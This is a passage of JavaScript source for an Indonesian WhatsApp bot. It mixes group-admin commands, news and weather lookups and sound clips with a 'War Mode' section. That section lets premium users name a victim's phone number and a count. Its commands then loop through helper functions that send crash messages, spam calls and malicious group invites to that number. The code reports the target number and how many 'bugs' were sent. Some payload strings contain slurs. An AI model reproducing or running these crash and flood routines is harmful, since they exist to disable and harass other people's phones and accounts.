‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎ \n`
for (let mem of participants) {
teks += `⊝ @${mem.id.split('@')[0]}\n`
}
ryozingod.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break
case 'linkgroup': case 'linkgc':{
if (!isOwner && !isAdmins) return xgreply(mess.admin)
if (!m.isGroup) return xgreply(mess.only.group)
if (!isBotAdmins) return xgreply(mess.only.badmin)
let response = await ryozingod.groupInviteCode(m.chat)
ryozingod.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
case 'editdesk':{
if (!isGroup) return xgreply(`Khusus Group Bego`)
if (!isPremium) return xgreply(mess.premium)
if (!isGroup) return xgreply(`Khusus Group Bego`)
if (!isBotAdmins) return xgreply(`Bot Bukan Admin Bego`)
if (!text) return xgreply(`teks untuk subject nya mana bego`)
await ryozingod.groupUpdateDescription(m.chat, text)
xgreply('Gacor Kang,Sukses,🔥')
}
break
case 'editsubjek': {
inireact()
if (!isPremium) return xgreply(mess.premium)
if (!isGroup) return xgreply(`Khusus Group Bego`)
if (!isAdmins && !isOwner) return xgreply('Khusus Admin')
if (!isBotAdmins) return xgreply(`Bot Bukan Admin Bego`)
if (!text) return xgreply(`teks untuk subject nya mana bego`)
await ryozingod.groupUpdateSubject(m.chat, text)
xgreply('Gacor Kang,Sukses,🔥')
}
break
case 'editinfo': {
inireact()
if (!isPremium) return xgreply(mess.premium)
if (!isGroup) return xgreply(`Khusus Group Bego`)
if (!isAdmins && !isOwner) return xgreply('Khusus Admin')
if (!isBotAdmins) return xgreply(`Bot Bukan Admin Bego`)
 if (args[0] === 'open'){
await ryozingod.groupSettingUpdate(m.chat, 'unlocked').then((res) => xgreply(`Sukses Membuka Edit Info Group`)).catch((err) => xgreply(jsonformat(err)))
 } else if (args[0] === 'close'){
await ryozingod.groupSettingUpdate(m.chat, 'locked').then((res) => reply(`Sukses Menutup Edit Info Group`)).catch((err) => xgreply(jsonformat(err)))
 } else {
 xgreply(` Silahkan Ketik\nEditinfo Open\nEditinfo Close`)
}
}
break

case 'editgroup': {
inireact()   
if (!isPremium) return xgreply(mess.premium)
if (!isGroup) return xgreply(`Khusus Group Bego`)
if (!isAdmins && !isOwner) return xgreply('Khusus Admin')
if (!isBotAdmins) return xgreply(`Bot Bukan Admin Bego`)
if (args[0] === 'close'){
await ryozingod.groupSettingUpdate(m.chat, 'announcement').then((res) => xgreply(`Sukses Menutup Group`)).catch((err) => xgreply(jsonformat(err)))
} else if (args[0] === 'open'){
await ryozingod.groupSettingUpdate(m.chat, 'not_announcement').then((res) => xgreply(`Sukses Membuka Group`)).catch((err) => xgreply(jsonformat(err)))
} else {
 xgreply(`Silahkan Ketik\nGroup Open\nGroup Close`)
 }
}
break
case "kick": {
inireact()
if (!isGroup) return xgreply('Only Group')
if (!isAdmins && !isOwner) return xgreply('Only Admin')
if (!isBotAdmins) return xgreply(`Bot Bukan Admin:(`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ryozingod.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => xgreply(util.format(res))).catch((err) => xgreply(util.format(err)))
}
break
case "demote": {
inireact()
if (!isPremium) return xgreply(mess.premium)
if (!isGroup) return xgreply('Only Group')
if (!isAdmins && !isOwner) return xgreply('Only Admin')
if (!isBotAdmins) return xgreply(`Bot Bukan Admi:(`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ryozingod.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => xgreply(util.format(res))).catch((err) => xgreply(util.format(err)))
}
break
case 'setppgroup': {
inireact()
if (!isDeveloper) return xgreply(mess.usingsetpp)
if (!isGroup) return xgreply('Only Group')
if (!isAdmins && !isOwner) return xgreply('Only Admin')
if (!isBotAdmins) return xgreply('Maaf Kak Kaya Nya Kakak Tidak Bisa Menggunakan Fitur Ini Di Karenakan Bot Bukan Admin Group')
if (!quoted) return xgreply(`*Where is the picture?*`)
if (!/image/.test(mime)) return xgreply(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
if (/webp/.test(mime)) return xgreply(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
var mediz = await ryozingod.downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(mediz)
await ryozingod.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(mediz)
xgreply(`*Success Beb✅*`)
} else {
var memeg = await ryozingod.updateProfilePicture(m.chat, { url: mediz })
fs.unlinkSync(mediz)
xgreply(`*Success Beb✅*`)
}
}
break

case 'beritacnn': {
  inireact();
  var { data } = await axios.get(`https://api.akuari.my.id/info/cnn`);
    const firstItem = data.result[0];
    xgreply(
      `
🌤️ Berikut Adalah Infonya

📰 Judul: ${firstItem.judul}
🔗 Link: ${firstItem.link}
📷 Gambar: ${firstItem.thumb}
`
    );
}
break

case 'beritamerdeka': {
  inireact();
  var { data } = await axios.get(`https://api.akuari.my.id/info/merdeka`);
    const firstItem = data.result[0];
    xgreply(
      `
🌤️ Berikut Adalah Infonya

📰 Judul: ${firstItem.judul}
🔗 Link: ${firstItem.link}
📷 Gambar: ${firstItem.thumb}
`
    );
}
break

case 'antaranews': {
  inireact();
  var { data } = await axios.get(`https://api.akuari.my.id/info/antaranews`);

  var newsInfo = data.result.map(info => `
📰 Title : [${info.label}] ${info.title}
🔗 Link : ${info.link}
📅 Date : ${info.date}
![Image](${info.image})
  `).join('\n\n');

  xgreply(`
📢 Berikut Adalah Info Berita Terkini
${newsInfo}
  `);
}
break

case 'infogempa': {
  inireact();
  var { data } = await axios.get(`https://api.akuari.my.id/info/gempa`);
  xgreply(
    `
🌤️ Berikut Adalah Infonya
    
⏰ Waktu : ${data.result.tanggal} ${data.result.jam} WIB
🌍 Lintang : ${data.result.lintang}
🌎 Bujur : ${data.result.bujur}
🌟 Magnitudo : ${data.result.magnitude}
🌊 Kedalaman : ${data.result.kedalaman}
🌏 Wilayah : ${data.result.wilayah}
`,
  );
}
break

case 'runtime':
                let pinga = `sᴘɪᴅᴇʀ-ᴍᴅ 𝙷𝙰𝚂 𝙱𝙴𝙴𝙽 𝙰𝙲𝚃𝙸𝚅𝙴 𝙵𝙾𝚁 ${runtime(process.uptime())}`
                ryozingod.sendMessage(m.chat, {
                    text: pinga,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: 'ѕρι∂єя-м∂',
                            body: '𝓚𝓲𝓷𝓰 𝓜𝓸𝓭𝔃',
                            thumbnailUrl: 'https://telegra.ph/file/e32f7c06e85d9d86ec82b.jpg',
                            sourceUrl: 'https://chat.whatsapp.com/EPSGKau0IVi7J5lyOJO7Jk',
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                break

case 'cuacabandara': {
  inireact();
  var { data } = await axios.get(`https://api.akuari.my.id/info/cuaca-bandara`);
  
  var weatherInfo = data.result.map(info => `
🛫 Nama Bandara : ${info.nama_bandara}
⏰ Waktu Pengamatan : ${info.waktu_pengamatan} WIB
🌬️ Arah Angin : ${info.arah_angin}
💨 Kecepatan Angin : ${info.kecepatan}
📏 Jarak Pandang : ${info.jarak_pandang}
🌥️ Cuaca : ${info.cuaca}
🌡️ Suhu : ${info.suhu}°C
💧 Titik Timbul : ${info.titik_timbun}°C
🌀 Tekanan Udara : ${info.tekanan_udara} hPa`).join('\n\n');

  xgreply(`
    ☁️ Berikut Adalah Info Cuaca Bandara
    ${weatherInfo}
  `);
}
break

case 'liputan6': {
  inireact();
  var { data } = await axios.get(`https://api.akuari.my.id/info/liputan6`);
  var firstItem = data.result[0];
  xgreply(
    `
📰 Judul: ${firstItem.title}
🔗 Link: ${firstItem.link}
📷 Gambar: ${firstItem.image}
📝 Deskripsi: ${firstItem.description}
`
  );
}
break

case 'jadwaltv': {
  inireact();
  var { data } = await axios.get(`https://api.akuari.my.id/info/jadwaltv?tv=sctv`);
  xgreply(`📺 ${data.list_tv}`
  );
}
break

case 'turnbackhoax': {
  inireact();
  var { data } = await axios.get(`https://api.akuari.my.id/info/turnbackhoax`);
  var hoaxItem = data.result[0];
  xgreply(
    `
🚨 Berita Hoax Terbaru

📰 Judul: ${hoaxItem.title}
🔗 Link: ${hoaxItem.link}
📷 Gambar: ${hoaxItem.img}
📅 Tanggal: ${hoaxItem.date}
📄 Deskripsi: ${hoaxItem.desc}
`
  )
}
break

//Sound
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161': {
koi = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await ryozingod.sendMessage(m.chat, { audio: koi, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}
break

//Cekrik
case "sshp": {
inireact()
if (!text) return xgreply(`*Example: ${prefix+command} ${global.yt}*`)
let phone = await ssweb(text, "phone")
ryozingod.sendFile(m.chat, phone.result, "", ``, m, false)
}
break
case "sspc": {
inireact()
if (!text) return xgreply(`*Example: ${prefix+command} ${global.yt}*`)
let desktop = await ssweb(text, "desktop")
ryozingod.sendFile(m.chat, desktop.result, "", ``, m, false)
}
break
case "sstablet": {
inireact()
if (!text) return xgreply(`*Example: ${prefix+command} ${global.yt}*`)
let tablet = await ssweb(text, "tablet")
ryozingod.sendFile(m.chat, tablet.result, "", ``, m, false)
}
break

//War Mode
case 'mimir':
case 'infinitecrash':
case 'listproduct':
case '1hit':
case '2hit':
case '3hit':
case 'penghitaman':
case 'hitamkan':
case 'zetsbug':
case 'xgbug':
case 'zetskil':
case 'gengod7':
case 'crashkah?':
case 'santet': {
inireact()
if (!isPremium) return xgreply(mess.premium)
if (!text) return xgreply(`Example: ${prefix + command} 6282823838,1`);
sendto = q.split(",")[0]+"@s.whatsapp.net"
jumlah = q.split(",")[1]
for (let i = 0; i < jumlah; i++) {
fcbug(sendto, jumlah,  `ՙ͜͜ ꒷⃟༑🦠 𝐓͢𝐇𝚺𝐙̸͢𝚵𝐓𝐒͢𝐔𝐁𝛀͢𝐗𝐘𝐆͢𝚺𝐍 ⿻  𝐙͢𝐱𝐕 ⟠ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 💀̳̳͒ ꒷ ՚͜͜ `)
await sleep(5000)
hmbug(sendto, `𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${ios1}`)
xgreply(mess.bugrespon + `\n❗Detail > \n🧪 Nomor Target : ${sendto} \n🧪 Jenis Bug : ${command}\n🧪 Jumlah Bug: ${jumlah}`)
}
}
break

case 'activecall':
case 'call1hit':
case 'startcall':
case 'newcall':
case 'skedulbotak':
case 'blowjobbug':
case 'bugcall': {
inireact()
if (!isPremium) return xgreply(mess.premium)
if (!text) return xgreply(`Example: ${prefix + command} 6282823838,1`);
sendto = q.split(",")[0]+"@s.whatsapp.net"
jumlah = q.split(",")[1]
hmbug(sendto, `𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${ios1}`)
await sleep(5000)
hmbug(sendto, `༑😈𝐏𝚯⃟𝐢𝐙𝟎𝐍 ⬪ 𝐙̸𝚺𝐓͢᪾𝐒𝐔𝐁𝚯⃟𝐗𝐆👿༑${ios1}`)
await sleep(5000)
xgreply(mess.bugrespon + `\n❗Detail > \n🧪 Nomor Target : ${sendto} \n🧪 Jenis Bug : ${command}\n🧪 Jumlah Bug: ${jumlah}`)
}
break

case 'vcsbug':
case 'videocallsexbug':
case 'callend':
case 'skedulend':
case 'skedulpler':
case 'sprite+insto':
case 'tahutempe':
case 'sumenga':
case 'videocallgey':
case 'bugmullet':
case 'endcall': {
inireact()
if (!isPremium) return xgreply(mess.premium)
if (!text) return xgreply(`Example: ${prefix + command} 6282823838,1`);
sendto = q.split(",")[0]+"@s.whatsapp.net"
jumlah = q.split(",")[1] * 20
for (let i = 0; i < jumlah; i++) {
await endcall(sendto, `𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${ios1}`)
await sleep(1000)
await endcall(sendto, `༑😈𝐏𝚯⃟𝐢𝐙𝟎𝐍 ⬪ 𝐙̸𝚺𝐓͢᪾𝐒𝐔𝐁𝚯⃟𝐗𝐆👿༑${ios1}`)
await sleep(1000)
await endcall(sendto, `𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${ios1}`)
await sleep(1000)
await endcall(sendto, `༑😈𝐏𝚯⃟𝐢𝐙𝟎𝐍 ⬪ 𝐙̸𝚺𝐓͢᪾𝐒𝐔𝐁𝚯⃟𝐗𝐆👿༑${ios1}`)
await sleep(1000)
await endcall(sendto, `𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${ios1}`)
await sleep(1000)
await endcall(sendto, `༑😈𝐏𝚯⃟𝐢𝐙𝟎𝐍 ⬪ 𝐙̸𝚺𝐓͢᪾𝐒𝐔𝐁𝚯⃟𝐗𝐆👿༑${ios1}`)
await sleep(1000)
await endcall(sendto, `𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${ios1}`)
await sleep(1000)
await endcall(sendto, `༑😈𝐏𝚯⃟𝐢𝐙𝟎𝐍 ⬪ 𝐙̸𝚺𝐓͢᪾𝐒𝐔𝐁𝚯⃟𝐗𝐆👿༑${ios1}`)
await sleep(1000)
await endcall(sendto, `𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${ios1}`)
await sleep(1000)
await endcall(sendto, `༑😈𝐏𝚯⃟𝐢𝐙𝟎𝐍 ⬪ 𝐙̸𝚺𝐓͢᪾𝐒𝐔𝐁𝚯⃟𝐗𝐆👿༑${ios1}`)
await sleep(1000)
}
xgreply(mess.bugrespon + `\n❗Detail > \n🧪 Nomor Target : ${sendto} \n🧪 Jenis Bug : ${command}\n🧪 Jumlah Bug: ${jumlah}`)
}
break

case 'zxvkill': 
case 'zxvreadhome': 
case 'zxvbug': 
case 'zxv💀':
case 'atomic':
case 'doti':
case 'meledak':
case 'crashbg?':
case 'crashkak?':
case 'crashin':
case 'plerku':
case 'aduhcrash':
case 'duarrr':
case 'bijimledak':
case 'sipilis':
case 'txtcrash': {
inireact()
if (!isPremium) return xgreply(mess.premium)
if (!text) return xgreply(`Example: ${prefix + command} 6282823838,1`);
sendto = q.split(",")[0]+"@s.whatsapp.net"
jumlah = q.split(",")[1]
bugq(sendto, jumlah,  `ՙ͜͜ ꒷⃟༑🦠 𝐓͢𝐇𝚺𝐙̸͢𝚵𝐓𝐒͢𝐔𝐁𝛀͢𝐗𝐘𝐆͢𝚺𝐍 ⿻  𝐙͢𝐱𝐕 ⟠ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 💀̳̳͒ ꒷ ՚͜͜ `)
await sleep(1000)
await bugq(sendto, jumlah,  `💔'҉༑⃟𝐓𝐇𝚺͢𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝟎̸͢𝐗𝐘𝐆̸𝚵𝐍❤️‍🩹`)
await sleep(1000)
await bugq(sendto, jumlah,  `༑😈𝐏𝚯⃟𝐢𝐙𝟎𝐍 ⬪ 𝐙̸𝚺𝐓͢᪾𝐒𝐔𝐁𝚯⃟𝐗𝐆👿༑`)
await sleep(1000)
bugq(sendto, jumlah,  `ՙ͜͜ ꒷⃟༑🦠 𝐓͢𝐇𝚺𝐙̸͢𝚵𝐓𝐒͢𝐔𝐁𝛀͢𝐗𝐘𝐆͢𝚺𝐍 ⿻  𝐙͢𝐱𝐕 ⟠ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 💀̳̳͒ ꒷ ՚͜͜ `)
await sleep(1000)
await bugq(sendto, jumlah,  `💔'҉༑⃟𝐓𝐇𝚺͢𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝟎̸͢𝐗𝐘𝐆̸𝚵𝐍❤️‍🩹`)
await sleep(1000)
await bugq(sendto, jumlah,  `༑😈𝐏𝚯⃟𝐢𝐙𝟎𝐍 ⬪ 𝐙̸𝚺𝐓͢᪾𝐒𝐔𝐁𝚯⃟𝐗𝐆👿༑`)
await sleep(1000)
bugq(sendto, jumlah,  `ՙ͜͜ ꒷⃟༑🦠 𝐓͢𝐇𝚺𝐙̸͢𝚵𝐓𝐒͢𝐔𝐁𝛀͢𝐗𝐘𝐆͢𝚺𝐍 ⿻  𝐙͢𝐱𝐕 ⟠ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 💀̳̳͒ ꒷ ՚͜͜ `)
await sleep(1000)
await bugq(sendto, jumlah,  `💔'҉༑⃟𝐓𝐇𝚺͢𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝟎̸͢𝐗𝐘𝐆̸𝚵𝐍❤️‍🩹`)
await sleep(1000)
await bugq(sendto, jumlah,  `༑😈𝐏𝚯⃟𝐢𝐙𝟎𝐍 ⬪ 𝐙̸𝚺𝐓͢᪾𝐒𝐔𝐁𝚯⃟𝐗𝐆👿༑`)
await sleep(1000)
bugq(sendto, jumlah,  `ՙ͜͜ ꒷⃟༑🦠 𝐓͢𝐇𝚺𝐙̸͢𝚵𝐓𝐒͢𝐔𝐁𝛀͢𝐗𝐘𝐆͢𝚺𝐍 ⿻  𝐙͢𝐱𝐕 ⟠ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 💀̳̳͒ ꒷ ՚͜͜ `)
await sleep(1000)
await bugq(sendto, jumlah,  `💔'҉༑⃟𝐓𝐇𝚺͢𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝟎̸͢𝐗𝐘𝐆̸𝚵𝐍❤️‍🩹`)
await sleep(1000)
await bugq(sendto, jumlah,  `༑😈𝐏𝚯⃟𝐢𝐙𝟎𝐍 ⬪ 𝐙̸𝚺𝐓͢᪾𝐒𝐔𝐁𝚯⃟𝐗𝐆👿༑`)
await sleep(1000)
xgreply(mess.bugrespon + `\n❗Detail > \n🧪 Nomor Target : ${sendto} \n🧪 Jenis Bug : ${command}\n🧪 Jumlah Bug: ${jumlah}`)
}
break

case 'buglist': {
for (let i = 0; i < 10; i++) {
 let sections = [{
    title: `Ah ah ah`,
    rows: [{
        title: mdelay,
        rowId: 'memaker 61533|'
    },
    {
        title: mdelay,
        rowId: 'menu'
    },
    {
        title: mdelay,
        rowId: 'menu'
    }
    ]
}];

let listMessage = {
    text: `💣𝐙𝐱𝐕 𝐋𝐞𝐠𝐞𝐧𝐝𝐬🎭 .༑ 𝒁𝒆𝒕𝒔𝒖𝒃𝒐𝑿𝒚𝒈𝒆𝒏 ༑🦠̸〪〪〪〪݆〫͆  𐍸 ❙❵`,
    footer: `🍻°⃟૰𝐤𝐢𝐥𝐥𝐞𝐫 -!𝐭𝐡𝐞𝐳𝐞𝐭𝐬𝐮𝐛𝐨𝐱𝐲𝐠𝐞𝐧🍺ꢵ`,
    buttonText: `⟠ 𝐙͢𝐱𝐕 々 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 ⿻`,
    sections
};

ryozingod.sendMessage(m.chat, listMessage, {
    quoted: ryobug
});
await sleep(500)
}
}
break

case 'deathinvite': 
case 'porninvite': 
case 'undanganbug': 
case 'ngundangcrash': 
case 'fckh?': {
inireact()
if (!isPremium) return xgreply(mess.premium)
if (!text) return xgreply(`Example: ${prefix + command} 6282823838,1`);
sendto = q.split(",")[0]+"@s.whatsapp.net"
jumlah = q.split(",")[1]
await invgp(sendto, jumlah,  `💔'҉༑⃟𝐓𝐇𝚺͢𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝟎̸͢𝐗𝐘𝐆̸𝚵𝐍❤️‍🩹`)
await sleep(1000)
await invgp(sendto, jumlah,  `ՙ͜͜ ꒷⃟༑🦠 𝐓͢𝐇𝚺𝐙̸͢𝚵𝐓𝐒͢𝐔𝐁𝛀͢𝐗𝐘𝐆͢𝚺𝐍 ⿻  𝐙͢𝐱𝐕 ⟠ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 💀̳̳͒ ꒷ ՚͜͜ `)
await sleep(1000)
xgreply(mess.bugrespon + `\n❗Detail > \n🧪 Jenis Bug : ${command}\n🧪 Jumlah Bug: ${jumlah}`)
}
break

case 'bugtroli':
case 'trolibit':
case 'cartmap':
case 'bitmapbug':
case 'carrinho':
case 'crashbitmap':
case 'pixelcrash': {
inireact()
if (!isPremium) return xgreply(mess.premium)
